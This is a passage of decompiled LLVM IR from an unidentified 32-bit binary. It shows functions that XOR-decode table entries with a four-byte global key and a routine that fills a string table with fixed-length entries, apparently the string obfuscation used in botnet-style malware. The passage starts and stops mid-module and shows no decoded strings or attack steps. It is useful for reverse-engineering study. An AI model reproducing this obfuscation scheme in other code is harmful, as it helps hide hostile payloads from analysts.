  uselistorder i8 62, { 8, 9, 5, 6, 3, 4, 7, 1, 0, 2 }
  uselistorder i8 58, { 8, 9, 5, 6, 3, 4, 7, 1, 0, 2, 10, 11 }
  uselistorder i32 ()* @function_80520f0, { 1, 0 }
  uselistorder i32 (i32*)* @function_8051d42, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 ()* @function_8051c88, { 1, 0 }
  uselistorder i32 1556, { 1, 2, 0 }
  uselistorder i32 1684, { 1, 0, 2 }
  uselistorder i32 ()* @function_804f2d0, { 3, 2, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i8 6, { 0, 3, 4, 5, 6, 2, 7, 1 }
  uselistorder i32 -28, { 3, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4 }
  uselistorder i32 -20, { 2, 1, 3, 4, 0, 5 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 ()* @function_804f020, { 3, 2, 1, 0 }
  uselistorder i16* @global_var_8056176.38, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1852, { 1, 2, 0, 3, 7, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050a57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80505f3, { 1, 0 }
  uselistorder label %dec_label_pc_8050523, { 2, 5, 8, 6, 4, 0, 1, 3, 7 }
  uselistorder label %dec_label_pc_805008b.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80504af, { 1, 0 }
  uselistorder label %dec_label_pc_805047f, { 1, 0 }
  uselistorder label %dec_label_pc_80503f8, { 1, 0 }
  uselistorder label %dec_label_pc_80503c8, { 1, 0 }
  uselistorder label %dec_label_pc_805038e, { 1, 0 }
  uselistorder label %dec_label_pc_8050383, { 3, 4, 7, 10, 8, 6, 0, 1, 2, 11, 5, 9 }
  uselistorder label %dec_label_pc_805028f, { 1, 0 }
  uselistorder label %dec_label_pc_805025f, { 1, 0 }
  uselistorder label %dec_label_pc_805020c, { 1, 0 }
  uselistorder label %dec_label_pc_80501d5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80501aa, { 1, 0 }
  uselistorder label %dec_label_pc_8050153, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805011f, { 1, 0 }
  uselistorder label %dec_label_pc_8050101, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_80500e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80500cd, { 1, 0 }
  uselistorder label %dec_label_pc_80500bb, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_805008f, { 1, 0 }
  uselistorder label %dec_label_pc_805008f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050062, { 1, 0 }
  uselistorder label %dec_label_pc_805005d, { 1, 0 }
  uselistorder label %dec_label_pc_805001b, { 1, 0 }
  uselistorder label %dec_label_pc_8050007, { 1, 0 }
  uselistorder label %dec_label_pc_804fffc.loopexit12.loopexit, { 8, 13, 11, 0, 4, 5, 6, 7, 9, 10, 12, 1, 2, 3, 14 }
  uselistorder label %dec_label_pc_804fffc.backedge, { 2, 4, 5, 3, 0, 1, 6 }
  uselistorder label %dec_label_pc_804ffc8, { 1, 0 }
  uselistorder label %dec_label_pc_804ff96, { 1, 0 }
  uselistorder label %dec_label_pc_804fece, { 5, 6, 7, 2, 0, 4, 1, 3 }
  uselistorder label %dec_label_pc_804feb3, { 1, 0 }
  uselistorder label %dec_label_pc_804fe8b, { 1, 0 }
  uselistorder label %dec_label_pc_804fe3a, { 3, 4, 0, 5, 1, 6, 2 }
  uselistorder label %dec_label_pc_804fe05, { 1, 0 }
  uselistorder label %dec_label_pc_804fdc0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804fca8, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_804fc9d, { 1, 0 }
  uselistorder label %dec_label_pc_804fc70, { 1, 0 }
  uselistorder label %dec_label_pc_804fc3a, { 1, 0 }
  uselistorder label %dec_label_pc_804fbf0.preheader, { 16, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15 }
  uselistorder label %dec_label_pc_804fa5d, { 1, 2, 4, 0, 3 }
}

define i32 @function_8050b30(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8050b30:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_8050b38 = icmp eq i32* %arg2, null
  %v1_8050b3a = mul i32 %arg1, 8
  store i32 %v1_8050b3a, i32* @edx, align 4
  br i1 %v1_8050b38, label %dec_label_pc_8050b53, label %dec_label_pc_8050b49

dec_label_pc_8050b49:                             ; preds = %dec_label_pc_8050b30
  %v1_8050b49 = add i32 %v1_8050b3a, add (i32 ptrtoint (i32* @global_var_8056620.52 to i32), i32 4)
  %v2_8050b49 = inttoptr i32 %v1_8050b49 to i32*
  %v3_8050b49 = load i32, i32* %v2_8050b49, align 4
  %v1_8050b4c = urem i32 %v3_8050b49, 65536
  store i32 %v1_8050b4c, i32* %arg2, align 4
  %v0_8050b53.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050b53

dec_label_pc_8050b53:                             ; preds = %dec_label_pc_8050b30, %dec_label_pc_8050b49
  %v0_8050b53 = phi i32 [ %v1_8050b3a, %dec_label_pc_8050b30 ], [ %v0_8050b53.pre, %dec_label_pc_8050b49 ]
  %v1_8050b53 = add i32 %v0_8050b53, ptrtoint (i32* @global_var_8056620.52 to i32)
  %v2_8050b53 = inttoptr i32 %v1_8050b53 to i32*
  %v3_8050b53 = load i32, i32* %v2_8050b53, align 4
  ret i32 %v3_8050b53

; uselistorder directives
  uselistorder label %dec_label_pc_8050b53, { 1, 0 }
}

define i32 @function_8050b60(i8 %arg1) local_unnamed_addr {
dec_label_pc_8050b60:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8050b69 = zext i8 %arg1 to i32
  %v1_8050b6d = mul nuw nsw i32 %v4_8050b69, 8
  %v2_8050b6d = add i32 %v1_8050b6d, ptrtoint (i32* @global_var_8056620.52 to i32)
  store i32 %v2_8050b6d, i32* @ecx, align 4
  %v0_8050b74 = load i16, i16* @global_var_805607c.53, align 2
  %v1_8050b74 = sext i16 %v0_8050b74 to i32
  %v1_8050b79 = add i32 %v1_8050b6d, add (i32 ptrtoint (i32* @global_var_8056620.52 to i32), i32 4)
  %v2_8050b79 = inttoptr i32 %v1_8050b79 to i16*
  %v3_8050b79 = load i16, i16* %v2_8050b79, align 4
  %v4_8050b79 = icmp eq i16 %v3_8050b79, 0
  br i1 %v4_8050b79, label %dec_label_pc_8050bca, label %dec_label_pc_8050b80

dec_label_pc_8050b80:                             ; preds = %dec_label_pc_8050b60
  store i32 %v1_8050b74, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_8050b88 = udiv i32 %v1_8050b74, 16777216
  %v2_8050b8b = udiv i32 %v1_8050b74, 256
  store i32 %v2_8050b8b, i32* %edi.global-to-local, align 4
  %v5_8050b8e = trunc i32 %v2_8050b88 to i8
  store i8 %v5_8050b8e, i8* %stack_var_-44, align 1
  %v2_8050b91 = udiv i32 %v1_8050b74, 65536
  store i32 %v2_8050b91, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050b94

dec_label_pc_8050b94:                             ; preds = %dec_label_pc_8050b94.dec_label_pc_8050b94_crit_edge, %dec_label_pc_8050b80
  %v0_8050b9a = phi i32 [ %v0_8050b9a.pre, %dec_label_pc_8050b94.dec_label_pc_8050b94_crit_edge ], [ %v1_8050b74, %dec_label_pc_8050b80 ]
  %v0_8050b96 = phi i32 [ %v1_8050bc6, %dec_label_pc_8050b94.dec_label_pc_8050b94_crit_edge ], [ 0, %dec_label_pc_8050b80 ]
  %v0_8050b94 = phi i32 [ %v0_8050bbe, %dec_label_pc_8050b94.dec_label_pc_8050b94_crit_edge ], [ %v2_8050b6d, %dec_label_pc_8050b80 ]
  %v1_8050b94 = inttoptr i32 %v0_8050b94 to i32*
  %v2_8050b94 = load i32, i32* %v1_8050b94, align 4
  %v2_8050b98 = add i32 %v2_8050b94, %v0_8050b96
  %v1_8050b9c = inttoptr i32 %v2_8050b98 to i8*
  %v2_8050b9c = load i8, i8* %v1_8050b9c, align 1
  %v4_8050b9c = trunc i32 %v0_8050b9a to i8
  %v5_8050b9c = xor i8 %v2_8050b9c, %v4_8050b9c
  store i8 %v5_8050b9c, i8* %v1_8050b9c, align 1
  %v0_8050b9e = load i32, i32* @edx, align 4
  %v0_8050ba0 = load i32, i32* @ecx, align 4
  %v1_8050ba0 = inttoptr i32 %v0_8050ba0 to i32*
  %v2_8050ba0 = load i32, i32* %v1_8050ba0, align 4
  %v2_8050ba2 = add i32 %v2_8050ba0, %v0_8050b9e
  %v0_8050ba4 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050ba6 = inttoptr i32 %v2_8050ba2 to i8*
  %v2_8050ba6 = load i8, i8* %v1_8050ba6, align 1
  %v4_8050ba6 = trunc i32 %v0_8050ba4 to i8
  %v5_8050ba6 = xor i8 %v2_8050ba6, %v4_8050ba6
  store i8 %v5_8050ba6, i8* %v1_8050ba6, align 1
  %v0_8050ba8 = load i32, i32* @edx, align 4
  %v0_8050baa = load i32, i32* @ecx, align 4
  %v1_8050baa = inttoptr i32 %v0_8050baa to i32*
  %v2_8050baa = load i32, i32* %v1_8050baa, align 4
  %v2_8050bac = add i32 %v2_8050baa, %v0_8050ba8
  %v0_8050bae = load i32, i32* %esi.global-to-local, align 4
  %v1_8050bb0 = inttoptr i32 %v2_8050bac to i8*
  %v2_8050bb0 = load i8, i8* %v1_8050bb0, align 1
  %v4_8050bb0 = trunc i32 %v0_8050bae to i8
  %v5_8050bb0 = xor i8 %v2_8050bb0, %v4_8050bb0
  store i8 %v5_8050bb0, i8* %v1_8050bb0, align 1
  %v0_8050bb2 = load i32, i32* @edx, align 4
  %v0_8050bb4 = load i32, i32* @ecx, align 4
  %v1_8050bb4 = inttoptr i32 %v0_8050bb4 to i32*
  %v2_8050bb4 = load i32, i32* %v1_8050bb4, align 4
  %v1_8050bb6 = add i32 %v0_8050bb2, 1
  store i32 %v1_8050bb6, i32* @edx, align 4
  %v2_8050bb7 = add i32 %v2_8050bb4, %v0_8050bb2
  %v2_8050bb9 = load i8, i8* %stack_var_-44, align 1
  %v1_8050bbc = inttoptr i32 %v2_8050bb7 to i8*
  %v2_8050bbc = load i8, i8* %v1_8050bbc, align 1
  %v5_8050bbc = xor i8 %v2_8050bbc, %v2_8050bb9
  store i8 %v5_8050bbc, i8* %v1_8050bbc, align 1
  %v0_8050bbe = load i32, i32* @ecx, align 4
  %v1_8050bbe = add i32 %v0_8050bbe, 4
  %v2_8050bbe = inttoptr i32 %v1_8050bbe to i32*
  %v3_8050bbe = load i32, i32* %v2_8050bbe, align 4
  %v1_8050bc1 = urem i32 %v3_8050bbe, 65536
  %v1_8050bc6 = load i32, i32* @edx, align 4
  %v8_8050bc8 = icmp sgt i32 %v1_8050bc1, %v1_8050bc6
  br i1 %v8_8050bc8, label %dec_label_pc_8050b94.dec_label_pc_8050b94_crit_edge, label %dec_label_pc_8050bca.loopexit

dec_label_pc_8050b94.dec_label_pc_8050b94_crit_edge: ; preds = %dec_label_pc_8050b94
  %v0_8050b9a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050b94

dec_label_pc_8050bca.loopexit:                    ; preds = %dec_label_pc_8050b94
  br label %dec_label_pc_8050bca

dec_label_pc_8050bca:                             ; preds = %dec_label_pc_8050bca.loopexit, %dec_label_pc_8050b60
  %v0_8050bd1 = phi i32 [ %v1_8050bc1, %dec_label_pc_8050bca.loopexit ], [ %v1_8050b74, %dec_label_pc_8050b60 ]
  ret i32 %v0_8050bd1

; uselistorder directives
  uselistorder i32 %v1_8050bc6, { 1, 0 }
  uselistorder i32 %v1_8050bc1, { 1, 0 }
  uselistorder i32 %v0_8050bbe, { 1, 0 }
  uselistorder i32 %v1_8050b74, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_8050be0(i8 %arg1) local_unnamed_addr {
dec_label_pc_8050be0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8050be9 = zext i8 %arg1 to i32
  %v1_8050bed = mul nuw nsw i32 %v4_8050be9, 8
  %v2_8050bed = add i32 %v1_8050bed, ptrtoint (i32* @global_var_8056620.52 to i32)
  store i32 %v2_8050bed, i32* %ecx.global-to-local, align 4
  %v0_8050bf4 = load i16, i16* @global_var_805607c.53, align 2
  %v1_8050bf4 = sext i16 %v0_8050bf4 to i32
  %v1_8050bf9 = add i32 %v1_8050bed, add (i32 ptrtoint (i32* @global_var_8056620.52 to i32), i32 4)
  %v2_8050bf9 = inttoptr i32 %v1_8050bf9 to i16*
  %v3_8050bf9 = load i16, i16* %v2_8050bf9, align 4
  %v4_8050bf9 = icmp eq i16 %v3_8050bf9, 0
  br i1 %v4_8050bf9, label %dec_label_pc_8050c4a, label %dec_label_pc_8050c00

dec_label_pc_8050c00:                             ; preds = %dec_label_pc_8050be0
  store i32 %v1_8050bf4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8050c08 = udiv i32 %v1_8050bf4, 16777216
  %v2_8050c0b = udiv i32 %v1_8050bf4, 256
  store i32 %v2_8050c0b, i32* %edi.global-to-local, align 4
  %v5_8050c0e = trunc i32 %v2_8050c08 to i8
  store i8 %v5_8050c0e, i8* %stack_var_-44, align 1
  %v2_8050c11 = udiv i32 %v1_8050bf4, 65536
  store i32 %v2_8050c11, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050c14

dec_label_pc_8050c14:                             ; preds = %dec_label_pc_8050c14.dec_label_pc_8050c14_crit_edge, %dec_label_pc_8050c00
  %v0_8050c1a = phi i32 [ %v0_8050c1a.pre, %dec_label_pc_8050c14.dec_label_pc_8050c14_crit_edge ], [ %v1_8050bf4, %dec_label_pc_8050c00 ]
  %v0_8050c16 = phi i32 [ %v1_8050c46, %dec_label_pc_8050c14.dec_label_pc_8050c14_crit_edge ], [ 0, %dec_label_pc_8050c00 ]
  %v0_8050c14 = phi i32 [ %v0_8050c3e, %dec_label_pc_8050c14.dec_label_pc_8050c14_crit_edge ], [ %v2_8050bed, %dec_label_pc_8050c00 ]
  %v1_8050c14 = inttoptr i32 %v0_8050c14 to i32*
  %v2_8050c14 = load i32, i32* %v1_8050c14, align 4
  %v2_8050c18 = add i32 %v2_8050c14, %v0_8050c16
  %v1_8050c1c = inttoptr i32 %v2_8050c18 to i8*
  %v2_8050c1c = load i8, i8* %v1_8050c1c, align 1
  %v4_8050c1c = trunc i32 %v0_8050c1a to i8
  %v5_8050c1c = xor i8 %v2_8050c1c, %v4_8050c1c
  store i8 %v5_8050c1c, i8* %v1_8050c1c, align 1
  %v0_8050c1e = load i32, i32* %edx.global-to-local, align 4
  %v0_8050c20 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c20 = inttoptr i32 %v0_8050c20 to i32*
  %v2_8050c20 = load i32, i32* %v1_8050c20, align 4
  %v2_8050c22 = add i32 %v2_8050c20, %v0_8050c1e
  %v0_8050c24 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050c26 = inttoptr i32 %v2_8050c22 to i8*
  %v2_8050c26 = load i8, i8* %v1_8050c26, align 1
  %v4_8050c26 = trunc i32 %v0_8050c24 to i8
  %v5_8050c26 = xor i8 %v2_8050c26, %v4_8050c26
  store i8 %v5_8050c26, i8* %v1_8050c26, align 1
  %v0_8050c28 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050c2a = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c2a = inttoptr i32 %v0_8050c2a to i32*
  %v2_8050c2a = load i32, i32* %v1_8050c2a, align 4
  %v2_8050c2c = add i32 %v2_8050c2a, %v0_8050c28
  %v0_8050c2e = load i32, i32* %esi.global-to-local, align 4
  %v1_8050c30 = inttoptr i32 %v2_8050c2c to i8*
  %v2_8050c30 = load i8, i8* %v1_8050c30, align 1
  %v4_8050c30 = trunc i32 %v0_8050c2e to i8
  %v5_8050c30 = xor i8 %v2_8050c30, %v4_8050c30
  store i8 %v5_8050c30, i8* %v1_8050c30, align 1
  %v0_8050c32 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050c34 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c34 = inttoptr i32 %v0_8050c34 to i32*
  %v2_8050c34 = load i32, i32* %v1_8050c34, align 4
  %v1_8050c36 = add i32 %v0_8050c32, 1
  store i32 %v1_8050c36, i32* %edx.global-to-local, align 4
  %v2_8050c37 = add i32 %v2_8050c34, %v0_8050c32
  %v2_8050c39 = load i8, i8* %stack_var_-44, align 1
  %v1_8050c3c = inttoptr i32 %v2_8050c37 to i8*
  %v2_8050c3c = load i8, i8* %v1_8050c3c, align 1
  %v5_8050c3c = xor i8 %v2_8050c3c, %v2_8050c39
  store i8 %v5_8050c3c, i8* %v1_8050c3c, align 1
  %v0_8050c3e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c3e = add i32 %v0_8050c3e, 4
  %v2_8050c3e = inttoptr i32 %v1_8050c3e to i32*
  %v3_8050c3e = load i32, i32* %v2_8050c3e, align 4
  %v1_8050c41 = urem i32 %v3_8050c3e, 65536
  %v1_8050c46 = load i32, i32* %edx.global-to-local, align 4
  %v8_8050c48 = icmp sgt i32 %v1_8050c41, %v1_8050c46
  br i1 %v8_8050c48, label %dec_label_pc_8050c14.dec_label_pc_8050c14_crit_edge, label %dec_label_pc_8050c4a.loopexit

dec_label_pc_8050c14.dec_label_pc_8050c14_crit_edge: ; preds = %dec_label_pc_8050c14
  %v0_8050c1a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050c14

dec_label_pc_8050c4a.loopexit:                    ; preds = %dec_label_pc_8050c14
  br label %dec_label_pc_8050c4a

dec_label_pc_8050c4a:                             ; preds = %dec_label_pc_8050c4a.loopexit, %dec_label_pc_8050be0
  %v0_8050c51 = phi i32 [ %v1_8050c41, %dec_label_pc_8050c4a.loopexit ], [ %v1_8050bf4, %dec_label_pc_8050be0 ]
  ret i32 %v0_8050c51

; uselistorder directives
  uselistorder i32 %v1_8050c46, { 1, 0 }
  uselistorder i32 %v1_8050c41, { 1, 0 }
  uselistorder i32 %v0_8050c3e, { 1, 0 }
  uselistorder i32 %v1_8050bf4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056620.52 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_805607c.53, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056620.52 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8050c60() local_unnamed_addr {
dec_label_pc_8050c60:
  %v1_8050c66 = call i32 @function_8052414(i32 2)
  store i32 %v1_8050c66, i32* @ebx, align 4
  %v4_8050c78 = call i32 @function_8051540(i32 %v1_8050c66, i32 ptrtoint ([3 x i8]* @global_var_80545d0.54 to i32), i32 2)
  %v0_8050c7d = load i32, i32* @ebx, align 4
  store i32 %v0_8050c7d, i32* @global_var_8056640.55, align 64
  store i16 2, i16* bitcast (i32* @global_var_8056644.56 to i16*), align 4
  %v1_8050c93 = call i32 @function_8052414(i32 2)
  store i32 %v1_8050c93, i32* @ebx, align 4
  %v4_8050ca5 = call i32 @function_8051540(i32 %v1_8050c93, i32 ptrtoint (i32* @global_var_80545d3.57 to i32), i32 2)
  %v0_8050caa = load i32, i32* @ebx, align 4
  store i32 %v0_8050caa, i32* @global_var_80566b8.58, align 8
  store i16 2, i16* bitcast (i32* @global_var_80566bc.59 to i16*), align 4
  %v1_8050cc0 = call i32 @function_8052414(i32 15)
  store i32 %v1_8050cc0, i32* @ebx, align 4
  %v4_8050cd2 = call i32 @function_8051540(i32 %v1_8050cc0, i32 ptrtoint (i32* @global_var_80545d6.60 to i32), i32 15)
  %v0_8050cd7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050cd7, i32* @global_var_8056630.61, align 16
  store i16 15, i16* bitcast (i32* @global_var_8056634.62 to i16*), align 4
  %v1_8050ced = call i32 @function_8052414(i32 29)
  store i32 %v1_8050ced, i32* @ebx, align 4
  %v4_8050cff = call i32 @function_8051540(i32 %v1_8050ced, i32 ptrtoint (i32* @global_var_80545e6.63 to i32), i32 29)
  %v0_8050d04 = load i32, i32* @ebx, align 4
  store i32 %v0_8050d04, i32* @global_var_8056648.64, align 8
  store i16 29, i16* bitcast (i32* @global_var_805664c.65 to i16*), align 4
  %v1_8050d1a = call i32 @function_8052414(i32 7)
  store i32 %v1_8050d1a, i32* @ebx, align 4
  %v4_8050d2c = call i32 @function_8051540(i32 %v1_8050d1a, i32 ptrtoint ([8 x i8]* @global_var_8054604.66 to i32), i32 7)
  %v0_8050d31 = load i32, i32* @ebx, align 4
  store i32 %v0_8050d31, i32* @global_var_8056650.67, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056654.68 to i16*), align 4
  %v1_8050d47 = call i32 @function_8052414(i32 5)
  store i32 %v1_8050d47, i32* @ebx, align 4
  %v4_8050d59 = call i32 @function_8051540(i32 %v1_8050d47, i32 ptrtoint ([6 x i8]* @global_var_805460c.69 to i32), i32 5)
  %v0_8050d5e = load i32, i32* @ebx, align 4
  store i32 %v0_8050d5e, i32* @global_var_8056658.70, align 8
  store i16 5, i16* bitcast (i32* @global_var_805665c.71 to i16*), align 4
  %v1_8050d74 = call i32 @function_8052414(i32 11)
  store i32 %v1_8050d74, i32* @ebx, align 4
  %v4_8050d86 = call i32 @function_8051540(i32 %v1_8050d74, i32 ptrtoint (i32* @global_var_8054612.72 to i32), i32 11)
  %v0_8050d8b = load i32, i32* @ebx, align 4
  store i32 %v0_8050d8b, i32* @global_var_8056660.73, align 32
  store i16 11, i16* bitcast (i32* @global_var_8056664.74 to i16*), align 4
  %v1_8050da1 = call i32 @function_8052414(i32 4)
  store i32 %v1_8050da1, i32* @ebx, align 4
  %v4_8050db3 = call i32 @function_8051540(i32 %v1_8050da1, i32 ptrtoint ([5 x i8]* @global_var_805461e.75 to i32), i32 4)
  %v0_8050db8 = load i32, i32* @ebx, align 4
  store i32 %v0_8050db8, i32* @global_var_8056668.76, align 8
  store i16 4, i16* bitcast (i32* @global_var_805666c.77 to i16*), align 4
  %v1_8050dce = call i32 @function_8052414(i32 7)
  store i32 %v1_8050dce, i32* @ebx, align 4
  %v4_8050de0 = call i32 @function_8051540(i32 %v1_8050dce, i32 ptrtoint ([8 x i8]* @global_var_8054623.78 to i32), i32 7)
  %v0_8050de5 = load i32, i32* @ebx, align 4
  store i32 %v0_8050de5, i32* @global_var_8056670.79, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056674.80 to i16*), align 4
  %v1_8050dfb = call i32 @function_8052414(i32 8)
  store i32 %v1_8050dfb, i32* @ebx, align 4
  %v4_8050e0d = call i32 @function_8051540(i32 %v1_8050dfb, i32 ptrtoint ([9 x i8]* @global_var_805462b.81 to i32), i32 8)
  %v0_8050e12 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e12, i32* @global_var_8056678.82, align 8
  store i16 8, i16* bitcast (i32* @global_var_805667c.83 to i16*), align 4
  %v1_8050e28 = call i32 @function_8052414(i32 13)
  store i32 %v1_8050e28, i32* @ebx, align 4
  %v4_8050e3a = call i32 @function_8051540(i32 %v1_8050e28, i32 ptrtoint (i32* @global_var_8054634.84 to i32), i32 13)
  %v0_8050e3f = load i32, i32* @ebx, align 4
  store i32 %v0_8050e3f, i32* @global_var_8056680.85, align 128
  store i16 13, i16* bitcast (i32* @global_var_8056684.86 to i16*), align 4
  %v1_8050e55 = call i32 @function_8052414(i32 10)
  store i32 %v1_8050e55, i32* @ebx, align 4
  %v4_8050e67 = call i32 @function_8051540(i32 %v1_8050e55, i32 ptrtoint ([11 x i8]* @global_var_8054642.87 to i32), i32 10)
  %v0_8050e6c = load i32, i32* @ebx, align 4
  store i32 %v0_8050e6c, i32* @global_var_8056688.88, align 8
  store i16 10, i16* bitcast (i32* @global_var_805668c.89 to i16*), align 4
  %v1_8050e82 = call i32 @function_8052414(i32 10)
  store i32 %v1_8050e82, i32* @ebx, align 4
  %v4_8050e94 = call i32 @function_8051540(i32 %v1_8050e82, i32 ptrtoint ([11 x i8]* @global_var_805464d.90 to i32), i32 10)
  %v0_8050e99 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e99, i32* @global_var_8056690.91, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056694.92 to i16*), align 4
  %v1_8050eaf = call i32 @function_8052414(i32 33)
  store i32 %v1_8050eaf, i32* @ebx, align 4
  %v4_8050ec1 = call i32 @function_8051540(i32 %v1_8050eaf, i32 ptrtoint (i32* @global_var_80547cc.93 to i32), i32 33)
  %v0_8050ec6 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ec6, i32* @global_var_8056698.94, align 8
  store i16 33, i16* bitcast (i32* @global_var_805669c.95 to i16*), align 4
  %v1_8050edc = call i32 @function_8052414(i32 8)
  store i32 %v1_8050edc, i32* @ebx, align 4
  %v4_8050eee = call i32 @function_8051540(i32 %v1_8050edc, i32 ptrtoint ([9 x i8]* @global_var_8054658.96 to i32), i32 8)
  %v0_8050ef3 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ef3, i32* @global_var_80566a0.97, align 32
  store i16 8, i16* bitcast (i32* @global_var_80566a4.98 to i16*), align 4
  %v1_8050f09 = call i32 @function_8052414(i32 11)
  store i32 %v1_8050f09, i32* @ebx, align 4
  %v4_8050f1b = call i32 @function_8051540(i32 %v1_8050f09, i32 ptrtoint ([12 x i8]* @global_var_8054661.99 to i32), i32 11)
  %v0_8050f20 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f20, i32* @global_var_80566a8.100, align 8
  store i16 11, i16* bitcast (i32* @global_var_80566ac.101 to i16*), align 4
  %v1_8050f36 = call i32 @function_8052414(i32 6)
  store i32 %v1_8050f36, i32* @ebx, align 4
  %v4_8050f48 = call i32 @function_8051540(i32 %v1_8050f36, i32 ptrtoint ([7 x i8]* @global_var_805466d.102 to i32), i32 6)
  %v0_8050f4d = load i32, i32* @ebx, align 4
  store i32 %v0_8050f4d, i32* @global_var_80566c0.103, align 64
  store i16 6, i16* bitcast (i32* @global_var_80566c4.104 to i16*), align 4
  %v1_8050f63 = call i32 @function_8052414(i32 7)
  store i32 %v1_8050f63, i32* @ebx, align 4
  %v4_8050f75 = call i32 @function_8051540(i32 %v1_8050f63, i32 ptrtoint ([8 x i8]* @global_var_8054674.105 to i32), i32 7)
  %v0_8050f7a = load i32, i32* @ebx, align 4
  store i32 %v0_8050f7a, i32* @global_var_80566c8.106, align 8
  store i16 7, i16* bitcast (i32* @global_var_80566cc.107 to i16*), align 4
  %v1_8050f90 = call i32 @function_8052414(i32 7)
  store i32 %v1_8050f90, i32* @ebx, align 4
  %v4_8050fa2 = call i32 @function_8051540(i32 %v1_8050f90, i32 ptrtoint ([8 x i8]* @global_var_805467c.108 to i32), i32 7)
  %v0_8050fa7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050fa7, i32* @global_var_80566d0.109, align 16
  store i16 7, i16* bitcast (i32* @global_var_80566d4.110 to i16*), align 4
  %v1_8050fbd = call i32 @function_8052414(i32 3)
  store i32 %v1_8050fbd, i32* @ebx, align 4
  %v4_8050fcf = call i32 @function_8051540(i32 %v1_8050fbd, i32 ptrtoint ([4 x i8]* @global_var_8054684.111 to i32), i32 3)
  %v0_8050fd4 = load i32, i32* @ebx, align 4
  store i32 %v0_8050fd4, i32* @global_var_80566d8.112, align 8
  store i16 3, i16* bitcast (i32* @global_var_80566dc.113 to i16*), align 4
  %v1_8050fea = call i32 @function_8052414(i32 19)
  store i32 %v1_8050fea, i32* @ebx, align 4
  %v4_8050ffc = call i32 @function_8051540(i32 %v1_8050fea, i32 ptrtoint (i32* @global_var_8054688.114 to i32), i32 19)
  %v0_8051001 = load i32, i32* @ebx, align 4
  store i32 %v0_8051001, i32* @global_var_80566e0.115, align 32
  store i16 19, i16* bitcast (i32* @global_var_80566e4.116 to i16*), align 4
  %v1_8051017 = call i32 @function_8052414(i32 24)
  store i32 %v1_8051017, i32* @ebx, align 4
  %v4_8051029 = call i32 @function_8051540(i32 %v1_8051017, i32 ptrtoint (i32* @global_var_805469c.117 to i32), i32 24)
  %v0_805102e = load i32, i32* @ebx, align 4
  store i32 %v0_805102e, i32* @global_var_80566e8.118, align 8
  store i16 24, i16* bitcast (i32* @global_var_80566ec.119 to i16*), align 4
  %v1_8051044 = call i32 @function_8052414(i32 9)
  store i32 %v1_8051044, i32* @ebx, align 4
  %v4_8051056 = call i32 @function_8051540(i32 %v1_8051044, i32 ptrtoint ([10 x i8]* @global_var_80546b5.120 to i32), i32 9)
  %v0_805105b = load i32, i32* @ebx, align 4
  store i32 %v0_805105b, i32* @global_var_80566f0.121, align 16
  store i16 9, i16* bitcast (i32* @global_var_80566f4.122 to i16*), align 4
  %v1_8051071 = call i32 @function_8052414(i32 16)
